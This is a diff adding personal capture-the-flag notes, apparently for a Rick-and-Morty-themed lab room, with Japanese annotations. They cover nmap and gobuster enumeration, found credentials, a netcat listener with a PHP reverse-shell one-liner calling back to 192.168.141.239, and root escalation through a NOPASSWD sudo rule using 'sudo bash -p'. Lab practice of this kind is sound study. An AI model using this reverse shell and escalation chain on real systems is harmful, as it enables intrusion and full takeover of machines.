@@ -1,0 +1,29 @@
+nmap -sC -sV -oN nmap.log 10.49.186.0
+
+
+Username:R1ckRul3s
+Wubbalubbadubdub
+
+-u:URL
+-w:ワードリスト
+-x:ワードリストに追加する拡張子
+-t:スレッド
+gobuster dir -u http://10.49.186.0 -w /usr/share/wordlists/dirb/common.txt -x php -t 50
+
+
+=== Reverse Shell ===
+# リスナー起動
+nc -lvnp 4444
+
+# PHPリバースシェル（ワンライナー）
+php -r '$sock=fsockopen("192.168.141.239",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+cat second\ ingredients
+
+(ALL)NOPASSWD: ALL
+
+sudo — (ALL)NOPASSWD: ALL なので、パスワードなしでroot権限でコマンド実行可能
+bash — 新しいbashシェルを起動
+-p — privileged mode。実効UID/GIDをリセットせず、rootのまま維持する
+sudo bash -p
